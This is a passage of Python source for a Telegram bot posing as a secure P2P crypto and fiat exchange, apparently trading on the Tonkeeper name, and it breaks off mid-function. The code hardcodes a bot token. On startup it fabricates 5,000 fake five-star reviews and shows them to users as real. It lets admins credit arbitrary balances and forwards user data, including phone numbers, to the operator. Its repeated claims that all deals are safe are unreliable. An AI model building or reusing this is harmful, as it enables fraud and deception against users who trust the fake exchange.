import asyncio
import json
import os
import uuid
import random
from datetime import datetime, timedelta
from typing import Dict, Any, List, Optional

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiohttp import web

# ============================================================
# 1. КОНФИГУРАЦИЯ
# ============================================================
BOT_TOKEN = "8973397612:AAGcMMe1r2DyZTziExnSVyjagdXm7fptrF8"
MASTER_ADMIN_ID = 8855434638
BOT_USERNAME = "tonkeeperp2p_bot"
BOT_NAME = "P2P Exchange"
CHANNEL_LINK = "https://t.me/tonkeeper_news"
MINI_APP_URL = "https://saitminiapp.onrender.com"
SUPPORT_LINK = "@p2psupbot"

# ============================================================
# 2. ИНИЦИАЛИЗАЦИЯ
# ============================================================
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# ============================================================
# 3. ФАЙЛЫ
# ============================================================
FILES = {
    "deals": "deals.json",
    "admins": "admins.json",
    "balance": "balance.json",
    "reviews": "reviews.json",
    "withdraw": "withdraw_requests.json",
    "verification": "verification_requests.json",
    "verification_sessions": "verification_sessions.json",
    "logs": "logs.json",
    "user_language": "user_language.json",
    "stats": "stats.json"
}

def load_json(file):
    if os.path.exists(file):
        with open(file, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_json(file, data):
    with open(file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

deals = load_json(FILES["deals"])
admins = load_json(FILES["admins"])
balance = load_json(FILES["balance"])
reviews = load_json(FILES["reviews"])
withdraw_requests = load_json(FILES["withdraw"])
verification_requests = load_json(FILES["verification"])
verification_sessions = load_json(FILES["verification_sessions"])
logs = load_json(FILES["logs"])
user_language = load_json(FILES["user_language"])
stats = load_json(FILES["stats"])

# ============================================================
# 4. ГЕНЕРАЦИЯ ОТЗЫВОВ
# ============================================================
def generate_reviews():
    if len(reviews) >= 5000:
        return
    review_texts = [
        "Отличная платформа! Всё работает быстро и надёжно.",
        "Лучший P2P обменник! Рекомендую всем друзьям.",
        "Быстро, удобно, безопасно. Буду пользоваться дальше.",
        "Отличная поддержка! Помогли разобраться с выводом.",
        "Наконец-то нашёл нормальный обменник. Всё честно.",
        "Сделал первую сделку, всё прошло гладко. Спасибо!",
        "За сутки сделал 5 сделок, все успешно завершены.",
        "Очень доволен сервисом. Вывод моментальный.",
        "Пользуюсь уже месяц, ни одной проблемы.",
        "Лучший сервис в Telegram! Успехов разработчикам."
    ]
    for i in range(5000):
        review_id = str(uuid.uuid4())[:8]
        reviews[review_id] = {
            "id": review_id,
            "user": "Аноним",
            "rating": random.randint(4, 5),
            "text": random.choice(review_texts),
            "anonymous": True,
            "date": datetime.now().strftime("%d.%m.%Y %H:%M"),
            "user_id": None
        }
    save_json(FILES["reviews"], reviews)

generate_reviews()

# ============================================================
# 5. ЯЗЫКИ
# ============================================================
LANGUAGES = {
    "ru": "🇷🇺 Русский",
    "en": "🇬🇧 English",
    "zh": "🇨🇳 中文",
    "ar": "🇸🇦 العربية"
}

LOCALE = {
    "ru": {
        "bot_name": "P2P Exchange",
        "bot_desc": "БЕЗОПАСНЫЕ СДЕЛКИ",
        "feature1": "Честные сделки между продавцами и покупателями",
        "feature2": "TON | STARS | RUB | UAH",
        "feature3": "Гарант безопасности с обеих сторон",
        "feature4": "Премиум поддержка 24/7",
        "how_it_works": "КАК ЭТО РАБОТАЕТ",
        "step1": "Создайте сделку в Mini App",
        "step2": "Отправьте ссылку покупателю",
        "step3": "Покупатель выбирает способ оплаты",
        "step4": "Администратор проверяет оплату",
        "step5": "Продавец нажимает «Передал товар»",
        "step6": "Покупатель нажимает «Получил товар»",
        "step7": "Деньги зачисляются на баланс продавца",
        "our_channel": "НАШ КАНАЛ",
        "support": "ПОДДЕРЖКА",
        "support_contact": "@p2psupbot",
        "start_now": "НАЧНИ ПРЯМО СЕЙЧАС",
        "create_deal": "СОЗДАТЬ СДЕЛКУ",
        "my_balance": "МОЙ БАЛАНС",
        "my_deals": "МОИ СДЕЛКИ",
        "how_to_deal": "КАК СОЗДАТЬ СДЕЛКУ",
        "faq": "ОТЗЫВЫ",
        "channel": "КАНАЛ",
        "admin_panel": "АДМИН ПАНЕЛЬ",
        "choose_action": "ВЫБЕРИТЕ ДЕЙСТВИЕ",
        "your_balance": "ВАШ БАЛАНС",
        "main_menu": "ГЛАВНОЕ МЕНЮ",
        "no_deals": "У ВАС НЕТ СДЕЛОК",
        "your_deals": "ВАШИ СДЕЛКИ",
        "deal_not_found": "СДЕЛКА НЕ НАЙДЕНА",
        "access_denied": "ДОСТУП ЗАПРЕЩЁН",
        "payment_confirmed": "ОПЛАТА ПОДТВЕРЖДЕНА",
        "seller_confirmed": "ВЫ ПОДТВЕРДИЛИ ПЕРЕДАЧУ ТОВАРА",
        "buyer_confirmed": "ВЫ ПОДТВЕРДИЛИ ПОЛУЧЕНИЕ ТОВАРА",
        "deal_completed": "СДЕЛКА ЗАВЕРШЕНА",
        "insufficient_balance": "НЕДОСТАТОЧНО СРЕДСТВ",
        "choose_payment_method": "ВЫБЕРИТЕ СПОСОБ ОПЛАТЫ",
        "pay_by_rekvisits": "ОПЛАТИТЬ ПО РЕКВИЗИТАМ",
        "pay_by_balance": "ОПЛАТИТЬ С БАЛАНСА",
        "status_waiting": "ОЖИДАНИЕ ОПЛАТЫ",
        "status_paid": "ОПЛАЧЕНО",
        "status_awaiting": "ОЖИДАНИЕ ПОДТВЕРЖДЕНИЯ",
        "status_completed": "ЗАВЕРШЕНО",
        "select_language": "ВЫБРАТЬ ЯЗЫК",
        "welcome": "ДОБРО ПОЖАЛОВАТЬ",
        "choose_language_prompt": "🌐 ВЫБЕРИТЕ ВАШ ЯЗЫК:",
        "product": "ТОВАР",
        "amount": "СУММА",
        "seller": "ПРОДАВЕЦ",
        "buyer": "ПОКУПАТЕЛЬ",
        "deal": "СДЕЛКА",
        "waiting_for_delivery": "ОЖИДАНИЕ ПЕРЕДАЧИ ТОВАРА",
        "seller_delivered": "ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР",
        "confirm_receipt": "ПОДТВЕРДИТЬ ПОЛУЧЕНИЕ",
        "contact_support": "В ПОДДЕРЖКУ",
        "balance_added": "БАЛАНС НАЧИСЛЕН",
        "admin_rights": "НЕДОСТАТОЧНО ПРАВ",
        "admin_added": "АДМИН ДОБАВЛЕН",
        "admin_removed": "АДМИН УДАЛЁН",
        "admin_list": "СПИСОК АДМИНОВ",
        "no_deals_total": "НЕТ СДЕЛОК",
        "all_deals_title": "ВСЕ СДЕЛКИ",
        "no_active_requests": "НЕТ АКТИВНЫХ ЗАЯВОК",
        "copy_link": "СКОПИРОВАТЬ ССЫЛКУ",
        "deal_link_text": "ССЫЛКА ДЛЯ ПОКУПАТЕЛЯ",
        "send_link_to_buyer": "ОТПРАВЬТЕ ССЫЛКУ ПОКУПАТЕЛЮ",
        "deal_created": "СДЕЛКА СОЗДАНА",
        "how_to_deal_text": "📖 <b>КАК СОЗДАТЬ СДЕЛКУ</b>\n\n1️⃣ Нажмите «СОЗДАТЬ СДЕЛКУ»\n   → Откроется Mini App\n\n2️⃣ Заполните форму:\n   • Название товара\n   • Валюту (TON/STARS/RUB/UAH)\n   • Сумму\n   • Username покупателя\n\n3️⃣ Выберите способ оплаты:\n   • С баланса — мгновенно\n   • По реквизитам — после проверки админом\n\n4️⃣ Отправьте ссылку покупателю\n\n5️⃣ После оплаты:\n   • Продавец нажимает «Передал товар»\n   • Покупатель нажимает «Получил товар»\n   • Деньги зачисляются на баланс\n\n🔥 ВСЕ СДЕЛКИ БЕЗОПАСНЫ!"
    },
    "en": {
        "bot_name": "P2P Exchange",
        "bot_desc": "SECURE DEALS",
        "feature1": "Fair deals between sellers and buyers",
        "feature2": "TON | STARS | RUB | UAH",
        "feature3": "Security guarantee from both sides",
        "feature4": "Premium 24/7 support",
        "how_it_works": "HOW IT WORKS",
        "step1": "Create deal in Mini App",
        "step2": "Send link to buyer",
        "step3": "Buyer chooses payment method",
        "step4": "Admin verifies payment",
        "step5": "Seller clicks 'Delivered'",
        "step6": "Buyer clicks 'Received'",
        "step7": "Money credited to seller's balance",
        "our_channel": "OUR CHANNEL",
        "support": "SUPPORT",
        "support_contact": "@p2psupbot",
        "start_now": "START NOW",
        "create_deal": "CREATE DEAL",
        "my_balance": "MY BALANCE",
        "my_deals": "MY DEALS",
        "how_to_deal": "HOW TO CREATE DEAL",
        "faq": "REVIEWS",
        "channel": "CHANNEL",
        "admin_panel": "ADMIN PANEL",
        "choose_action": "CHOOSE ACTION",
        "your_balance": "YOUR BALANCE",
        "main_menu": "MAIN MENU",
        "no_deals": "YOU HAVE NO DEALS",
        "your_deals": "YOUR DEALS",
        "deal_not_found": "DEAL NOT FOUND",
        "access_denied": "ACCESS DENIED",
        "payment_confirmed": "PAYMENT CONFIRMED",
        "seller_confirmed": "YOU CONFIRMED DELIVERY",
        "buyer_confirmed": "YOU CONFIRMED RECEIPT",
        "deal_completed": "DEAL COMPLETED",
        "insufficient_balance": "INSUFFICIENT BALANCE",
        "choose_payment_method": "CHOOSE PAYMENT METHOD",
        "pay_by_rekvisits": "PAY BY DETAILS",
        "pay_by_balance": "PAY FROM BALANCE",
        "status_waiting": "WAITING FOR PAYMENT",
        "status_paid": "PAID",
        "status_awaiting": "AWAITING CONFIRMATION",
        "status_completed": "COMPLETED",
        "select_language": "SELECT LANGUAGE",
        "welcome": "WELCOME",
        "choose_language_prompt": "🌐 SELECT YOUR LANGUAGE:",
        "product": "PRODUCT",
        "amount": "AMOUNT",
        "seller": "SELLER",
        "buyer": "BUYER",
        "deal": "DEAL",
        "waiting_for_delivery": "WAITING FOR DELIVERY",
        "seller_delivered": "SELLER DELIVERED",
        "confirm_receipt": "CONFIRM RECEIPT",
        "contact_support": "CONTACT SUPPORT",
        "balance_added": "BALANCE ADDED",
        "admin_rights": "INSUFFICIENT RIGHTS",
        "admin_added": "ADMIN ADDED",
        "admin_removed": "ADMIN REMOVED",
        "admin_list": "ADMIN LIST",
        "no_deals_total": "NO DEALS",
        "all_deals_title": "ALL DEALS",
        "no_active_requests": "NO ACTIVE REQUESTS",
        "copy_link": "COPY LINK",
        "deal_link_text": "LINK FOR BUYER",
        "send_link_to_buyer": "SEND LINK TO BUYER",
        "deal_created": "DEAL CREATED",
        "how_to_deal_text": "📖 <b>HOW TO CREATE A DEAL</b>\n\n1️⃣ Click 'CREATE DEAL'\n   → Opens Mini App\n\n2️⃣ Fill in the form:\n   • Product name\n   • Currency (TON/STARS/RUB/UAH)\n   • Amount\n   • Buyer's username\n\n3️⃣ Choose payment method:\n   • From balance — instantly\n   • By details — after admin check\n\n4️⃣ Send the link to the buyer\n\n5️⃣ After payment:\n   • Seller clicks 'Delivered'\n   • Buyer clicks 'Received'\n   • Money goes to balance\n\n🔥 ALL DEALS ARE SAFE!"
    },
    "zh": {
        "bot_name": "P2P Exchange",
        "bot_desc": "安全交易",
        "feature1": "买卖双方公平交易",
        "feature2": "TON | STARS | RUB | UAH",
        "feature3": "双方安全保障",
        "feature4": "24/7高级支持",
        "how_it_works": "运作方式",
        "step1": "在Mini App中创建交易",
        "step2": "发送链接给买家",
        "step3": "买家选择支付方式",
        "step4": "管理员验证付款",
        "step5": "卖家点击「已交付」",
        "step6": "买家点击「已收到」",
        "step7": "款项计入卖家余额",
        "our_channel": "我们的频道",
        "support": "支持",
        "support_contact": "@p2psupbot",
        "start_now": "立即开始",
        "create_deal": "创建交易",
        "my_balance": "我的余额",
        "my_deals": "我的交易",
        "how_to_deal": "如何创建交易",
        "faq": "评论",
        "channel": "频道",
        "admin_panel": "管理面板",
        "choose_action": "选择操作",
        "your_balance": "您的余额",
        "main_menu": "主菜单",
        "no_deals": "您没有任何交易",
        "your_deals": "您的交易",
        "deal_not_found": "交易未找到",
        "access_denied": "访问被拒绝",
        "payment_confirmed": "付款已确认",
        "seller_confirmed": "您已确认交付",
        "buyer_confirmed": "您已确认收到",
        "deal_completed": "交易已完成",
        "insufficient_balance": "余额不足",
        "choose_payment_method": "选择支付方式",
        "pay_by_rekvisits": "按信息付款",
        "pay_by_balance": "从余额付款",
        "status_waiting": "等待付款",
        "status_paid": "已付款",
        "status_awaiting": "等待确认",
        "status_completed": "已完成",
        "select_language": "选择语言",
        "welcome": "欢迎",
        "choose_language_prompt": "🌐 选择您的语言:",
        "product": "商品",
        "amount": "金额",
        "seller": "卖家",
        "buyer": "买家",
        "deal": "交易",
        "waiting_for_delivery": "等待交付",
        "seller_delivered": "卖家已交付",
        "confirm_receipt": "确认收到",
        "contact_support": "联系客服",
        "balance_added": "余额已添加",
        "admin_rights": "权限不足",
        "admin_added": "管理员已添加",
        "admin_removed": "管理员已移除",
        "admin_list": "管理员列表",
        "no_deals_total": "无交易",
        "all_deals_title": "所有交易",
        "no_active_requests": "无活跃申请",
        "copy_link": "复制链接",
        "deal_link_text": "买家链接",
        "send_link_to_buyer": "发送链接给买家",
        "deal_created": "交易已创建",
        "how_to_deal_text": "📖 <b>如何创建交易</b>\n\n1️⃣ 点击「创建交易」\n   → 打开 Mini App\n\n2️⃣ 填写表格：\n   • 商品名称\n   • 货币 (TON/STARS/RUB/UAH)\n   • 金额\n   • 买家用户名\n\n3️⃣ 选择支付方式：\n   • 从余额支付 — 即时\n   • 按详情支付 — 管理员检查后\n\n4️⃣ 发送链接给买家\n\n5️⃣ 付款后：\n   • 卖家点击「已交付」\n   • 买家点击「已收到」\n   • 钱款计入余额\n\n🔥 所有交易都安全！"
    },
    "ar": {
        "bot_name": "P2P Exchange",
        "bot_desc": "صفقات آمنة",
        "feature1": "صفقات عادلة بين البائعين والمشترين",
        "feature2": "TON | STARS | RUB | UAH",
        "feature3": "ضمان الأمن من كلا الجانبين",
        "feature4": "دعم بريميوم 24/7",
        "how_it_works": "كيف يعمل",
        "step1": "إنشاء صفقة في Mini App",
        "step2": "إرسال الرابط للمشتري",
        "step3": "المشتري يختار طريقة الدفع",
        "step4": "المدقق يتحقق من الدفع",
        "step5": "البائع يضغط «تم التسليم»",
        "step6": "المشتري يضغط «تم الاستلام»",
        "step7": "تضاف الأموال إلى رصيد البائع",
        "our_channel": "قناتنا",
        "support": "الدعم",
        "support_contact": "@p2psupbot",
        "start_now": "ابدأ الآن",
        "create_deal": "إنشاء صفقة",
        "my_balance": "رصيدي",
        "my_deals": "صفقاتي",
        "how_to_deal": "كيفية إنشاء صفقة",
        "faq": "مراجعات",
        "channel": "القناة",
        "admin_panel": "لوحة التحكم",
        "choose_action": "اختر إجراء",
        "your_balance": "رصيدك",
        "main_menu": "القائمة الرئيسية",
        "no_deals": "ليس لديك صفقات",
        "your_deals": "صفقاتك",
        "deal_not_found": "الصفقة غير موجودة",
        "access_denied": "الوصول مرفوض",
        "payment_confirmed": "تم تأكيد الدفع",
        "seller_confirmed": "لقد أكدت التسليم",
        "buyer_confirmed": "لقد أكدت الاستلام",
        "deal_completed": "الصفقة مكتملة",
        "insufficient_balance": "رصيد غير كافٍ",
        "choose_payment_method": "اختر طريقة الدفع",
        "pay_by_rekvisits": "الدفع حسب التفاصيل",
        "pay_by_balance": "الدفع من الرصيد",
        "status_waiting": "انتظار الدفع",
        "status_paid": "تم الدفع",
        "status_awaiting": "انتظار التأكيد",
        "status_completed": "مكتملة",
        "select_language": "اختر اللغة",
        "welcome": "مرحباً",
        "choose_language_prompt": "🌐 اختر لغتك:",
        "product": "المنتج",
        "amount": "المبلغ",
        "seller": "البائع",
        "buyer": "المشتري",
        "deal": "الصفقة",
        "waiting_for_delivery": "انتظار التسليم",
        "seller_delivered": "البائع سلم المنتج",
        "confirm_receipt": "تأكيد الاستلام",
        "contact_support": "اتصل بالدعم",
        "balance_added": "تم إضافة الرصيد",
        "admin_rights": "صلاحيات غير كافية",
        "admin_added": "تم إضافة المدقق",
        "admin_removed": "تم إزالة المدقق",
        "admin_list": "قائمة المدققين",
        "no_deals_total": "لا توجد صفقات",
        "all_deals_title": "جميع الصفقات",
        "no_active_requests": "لا توجد طلبات نشطة",
        "copy_link": "انسخ الرابط",
        "deal_link_text": "رابط المشتري",
        "send_link_to_buyer": "أرسل الرابط للمشتري",
        "deal_created": "تم إنشاء الصفقة",
        "how_to_deal_text": "📖 <b>كيفية إنشاء صفقة</b>\n\n1️⃣ اضغط «إنشاء صفقة»\n   → يفتح Mini App\n\n2️⃣ املأ النموذج:\n   • اسم المنتج\n   • العملة (TON/STARS/RUB/UAH)\n   • المبلغ\n   • اسم مستخدم المشتري\n\n3️⃣ اختر طريقة الدفع:\n   • من الرصيد — فوري\n   • حسب التفاصيل — بعد فحص المدقق\n\n4️⃣ أرسل الرابط للمشتري\n\n5️⃣ بعد الدفع:\n   • البائع يضغط «تم التسليم»\n   • المشتري يضغط «تم الاستلام»\n   • تضاف الأموال إلى الرصيد\n\n🔥 جميع الصفقات آمنة!"
    }
}

def get_text(lang: str, key: str) -> str:
    if lang in LOCALE and key in LOCALE[lang]:
        return LOCALE[lang][key]
    return LOCALE["ru"].get(key, key)

# ============================================================
# 6. ПОМОЩНИКИ
# ============================================================
def is_admin(user_id: int) -> bool:
    return user_id == MASTER_ADMIN_ID or str(user_id) in admins

def get_balance(user_id: int):
    uid = str(user_id)
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
        save_json(FILES["balance"], balance)
    return balance[uid]

def add_balance(user_id: int, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
    balance[uid][curr] = balance[uid].get(curr, 0) + amount
    save_json(FILES["balance"], balance)

def get_user_language(user_id: int) -> str:
    uid = str(user_id)
    return user_language.get(uid, "ru")

def set_user_language(user_id: int, lang: str):
    user_language[str(user_id)] = lang
    save_json(FILES["user_language"], user_language)

def add_log(action: str, data: dict):
    log_id = str(uuid.uuid4())[:8]
    log_entry = {
        "id": log_id,
        "action": action,
        "data": data,
        "time": datetime.now().isoformat()
    }
    logs[log_id] = log_entry
    save_json(FILES["logs"], logs)
    
    try:
        asyncio.create_task(send_log_to_admin(action, data))
    except:
        pass

async def send_log_to_admin(action: str, data: dict):
    try:
        text = f"📋 <b>ЛОГ ДЕЙСТВИЯ</b>\n\n"
        text += f"📌 <b>Действие:</b> {action}\n"
        text += f"🕐 <b>Время:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        
        for key, value in data.items():
            if key == 'admin':
                text += f"👑 <b>Админ:</b> @{value}\n"
            elif key == 'user_id':
                text += f"👤 <b>Пользователь ID:</b> {value}\n"
            elif key == 'username':
                text += f"👤 <b>Username:</b> @{value}\n"
            elif key == 'deal_id':
                text += f"🆔 <b>Сделка:</b> #{value}\n"
            elif key == 'amount':
                text += f"💰 <b>Сумма:</b> {value}\n"
            elif key == 'currency':
                text += f"💱 <b>Валюта:</b> {value}\n"
            elif key == 'product':
                text += f"📦 <b>Товар:</b> {value}\n"
            elif key == 'buyer_username':
                text += f"👤 <b>Покупатель:</b> @{value}\n"
            elif key == 'seller_username':
                text += f"👤 <b>Продавец:</b> @{value}\n"
            elif key == 'phone':
                text += f"📱 <b>Телефон:</b> {value}\n"
            elif key == 'status':
                text += f"📊 <b>Статус:</b> {value}\n"
            else:
                text += f"📎 <b>{key}:</b> {value}\n"
        
        await bot.send_message(MASTER_ADMIN_ID, text[:4000])
    except Exception as e:
        print(f"Ошибка отправки лога: {e}")

# ============================================================
# 7. КЛАВИАТУРЫ
# ============================================================
def main_menu_keyboard(user_id: int):
    lang = get_user_language(user_id)
    buttons = [
        [
            InlineKeyboardButton(text=f"📱 {get_text(lang, 'create_deal')}", web_app=WebAppInfo(url=MINI_APP_URL)),
            InlineKeyboardButton(text=f"💰 {get_text(lang, 'my_balance')}", callback_data="menu_balance"),
        ],
        [
            InlineKeyboardButton(text=f"📊 {get_text(lang, 'my_deals')}", callback_data="menu_deals"),
            InlineKeyboardButton(text=f"📖 {get_text(lang, 'how_to_deal')}", callback_data="how_to_deal"),
        ],
        [
            InlineKeyboardButton(text=f"⭐️ {get_text(lang, 'faq')}", callback_data="menu_reviews"),
            InlineKeyboardButton(text=f"📢 {get_text(lang, 'channel')}", callback_data="menu_channel"),
        ],
        [
            InlineKeyboardButton(text=f"🌐 {get_text(lang, 'select_language')}", callback_data="select_language"),
        ]
    ]
    if is_admin(user_id):
        buttons.append([
            InlineKeyboardButton(text=f"👑 {get_text(lang, 'admin_panel')}", callback_data="menu_admin"),
        ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def admin_panel_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"💰 {get_text(lang, 'balance_added')}", callback_data="admin_add_balance")],
        [InlineKeyboardButton(text=f"👥 {get_text(lang, 'admin_list')}", callback_data="admin_manage_admins")],
        [InlineKeyboardButton(text=f"📊 {get_text(lang, 'all_deals_title')}", callback_data="admin_all_deals")],
        [InlineKeyboardButton(text=f"💲 Заявки на вывод", callback_data="admin_withdraw_requests")],
        [InlineKeyboardButton(text=f"🔐 Запросы верификации", callback_data="admin_verification_requests")],
        [InlineKeyboardButton(text=f"⭐️ {get_text(lang, 'faq')}", callback_data="admin_manage_reviews")],
        [InlineKeyboardButton(text=f"📋 Логи", callback_data="admin_logs")],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def back_to_main_keyboard(user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def language_keyboard():
    buttons = []
    for lang_code, lang_name in LANGUAGES.items():
        buttons.append([InlineKeyboardButton(text=lang_name, callback_data=f"set_lang_{lang_code}")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def payment_method_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"💳 {get_text(lang, 'pay_by_rekvisits')}", callback_data=f"pay_rekvisits_{deal_id}")],
        [InlineKeyboardButton(text=f"💰 {get_text(lang, 'pay_by_balance')}", callback_data=f"pay_balance_{deal_id}")],
        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
    ])

def seller_confirm_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📦 {get_text(lang, 'seller_delivered')}", callback_data=f"seller_done_{deal_id}")]
    ])

def buyer_confirm_keyboard(deal_id: str, user_id: int):
    lang = get_user_language(user_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"✅ {get_text(lang, 'confirm_receipt')}", callback_data=f"buyer_confirm_{deal_id}")],
        [InlineKeyboardButton(text=f"🆘 {get_text(lang, 'contact_support')}", callback_data=f"support_{deal_id}")]
    ])

def currency_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 TON", callback_data="curr_TON")],
        [InlineKeyboardButton(text="⭐️ STARS", callback_data="curr_STARS")],
        [InlineKeyboardButton(text="💰 RUB", callback_data="curr_RUB")],
        [InlineKeyboardButton(text="🌐 UAH", callback_data="curr_UAH")],
    ])

# ============================================================
# 8. FSM АДМИНА
# ============================================================
class AdminStates(StatesGroup):
    waiting_user_id = State()
    waiting_currency = State()
    waiting_amount = State()

# ============================================================
# 9. ОБРАБОТЧИКИ БОТА
# ============================================================
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.text and message.text.startswith("/start deal_"):
        deal_id = message.text.split("_")[1]
        await handle_deal_link(message, deal_id)
        return
    
    uid = str(message.from_user.id)
    if uid not in user_language:
        await message.answer(
            f"🌐 {get_text('ru', 'choose_language_prompt')}",
            reply_markup=language_keyboard()
        )
        return
    
    lang = get_user_language(message.from_user.id)
    welcome_text = f"""🔥 <b>{BOT_NAME}</b> 🔥

{get_text(lang, 'bot_desc')}
• {get_text(lang, 'feature1')}
• {get_text(lang, 'feature2')}
• {get_text(lang, 'feature3')}
• {get_text(lang, 'feature4')}

📊 {get_text(lang, 'how_it_works')}:
1️⃣ {get_text(lang, 'step1')}
2️⃣ {get_text(lang, 'step2')}
3️⃣ {get_text(lang, 'step3')}
4️⃣ {get_text(lang, 'step4')}
5️⃣ {get_text(lang, 'step5')}
6️⃣ {get_text(lang, 'step6')}
7️⃣ {get_text(lang, 'step7')}

📢 {get_text(lang, 'our_channel')}: {CHANNEL_LINK}
🆘 {get_text(lang, 'support')}: {get_text(lang, 'support_contact')}

🔥 {get_text(lang, 'start_now')} 🚀"""
    
    await message.answer(welcome_text, reply_markup=main_menu_keyboard(message.from_user.id))

@dp.callback_query(lambda c: c.data.startswith("set_lang_"))
async def set_language(callback: types.CallbackQuery):
    lang = callback.data.split("_")[2]
    set_user_language(callback.from_user.id, lang)
    await callback.answer(f"{get_text(lang, 'welcome')}")
    await cmd_start(callback.message)

@dp.callback_query(lambda c: c.data == "select_language")
async def select_language(callback: types.CallbackQuery):
    await callback.message.edit_text(
        f"🌐 {get_text('ru', 'choose_language_prompt')}",
        reply_markup=language_keyboard()
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "back_to_main")
async def back_to_main(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    try:
        await callback.message.edit_text(
            f"🔥 <b>P2P Exchange</b> 🔥\n\n{get_text(lang, 'choose_action')}:",
            reply_markup=main_menu_keyboard(callback.from_user.id)
        )
    except:
        await callback.message.answer(
            f"🔥 <b>P2P Exchange</b> 🔥\n\n{get_text(lang, 'choose_action')}:",
            reply_markup=main_menu_keyboard(callback.from_user.id)
        )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "menu_channel")
async def menu_channel(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    text = f"""📢 {get_text(lang, 'our_channel')}

🔥 {get_text(lang, 'subscribe')}:
{CHANNEL_LINK}

🚀 {get_text(lang, 'click_subscribe')}"""
    await callback.message.edit_text(text, reply_markup=back_to_main_keyboard(callback.from_user.id))
    await callback.answer()

@dp.callback_query(lambda c: c.data == "how_to_deal")
async def how_to_deal(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    text = get_text(lang, 'how_to_deal_text')
    await callback.message.edit_text(text, reply_markup=back_to_main_keyboard(callback.from_user.id))
    await callback.answer()

# ============================================================
# 10. БАЛАНС
# ============================================================
@dp.callback_query(lambda c: c.data == "menu_balance")
async def menu_balance(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    bal = get_balance(callback.from_user.id)
    text = f"""💰 <b>{get_text(lang, 'your_balance')}</b>

💎 TON: {bal.get('ton', 0)}
⭐️ STARS: {bal.get('stars', 0)}
💰 RUB: {bal.get('rub', 0)}
🌐 UAH: {bal.get('uah', 0)}

📊 Сделок завершено: {sum(bal.get('deal_partners', {}).values())}"""
    await callback.message.edit_text(
        text,
        reply_markup=back_to_main_keyboard(callback.from_user.id)
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "menu_deals")
async def menu_deals(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    user_deals = []
    for d_id, d in deals.items():
        if d.get("seller_id") == callback.from_user.id or d.get("buyer_id") == callback.from_user.id:
            user_deals.append((d_id, d))
    if not user_deals:
        await callback.message.edit_text(
            f"📭 {get_text(lang, 'no_deals')}",
            reply_markup=back_to_main_keyboard(callback.from_user.id)
        )
        return
    text = f"📊 <b>{get_text(lang, 'your_deals')}</b>\n\n"
    for d_id, d in user_deals[-10:]:
        status_map = {
            "waiting_payment": f"⏳ {get_text(lang, 'status_waiting')}",
            "paid": f"✅ {get_text(lang, 'status_paid')}",
            "awaiting_confirmation": f"📦 {get_text(lang, 'status_awaiting')}",
            "completed": f"🎉 {get_text(lang, 'status_completed')}"
        }
        text += f"#{d_id} | {status_map.get(d['status'], d['status'])} | {d['amount']} {d['currency']}\n"
        text += f"   → {d['product'][:30]}\n\n"
    await callback.message.edit_text(
        text,
        reply_markup=back_to_main_keyboard(callback.from_user.id)
    )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "menu_reviews")
async def menu_reviews(callback: types.CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    reviews_list = list(reviews.values())
    
    if not reviews_list:
        text = f"⭐️ <b>{get_text(lang, 'faq')}</b>\n\nПока нет отзывов"
    else:
        text = f"⭐️ <b>{get_text(lang, 'faq')}</b> (всего: {len(reviews_list)})\n\n"
        for r in reviews_list[-10:]:
            user = r.get('user', 'Аноним')
            rating = '⭐' * r.get('rating', 5)
            text += f"👤 <b>{user}</b> | {rating}\n"
            text += f"📝 {r.get('text', '')[:150]}\n"
            text += f"🕐 {r.get('date', 'недавно')}\n\n"
    
    await callback.message.edit_text(
        text[:4000],
        reply_markup=back_to_main_keyboard(callback.from_user.id)
    )
    await callback.answer()

# ============================================================
# 11. СДЕЛКИ
# ============================================================
async def handle_deal_link(message: types.Message, deal_id: str):
    lang = get_user_language(message.from_user.id)
    if deal_id not in deals:
        await message.answer(f"❌ {get_text(lang, 'deal_not_found')}")
        return

    deal = deals[deal_id]
    if deal["status"] != "waiting_payment":
        await message.answer(f"❌ {get_text(lang, 'deal_not_found')}")
        return

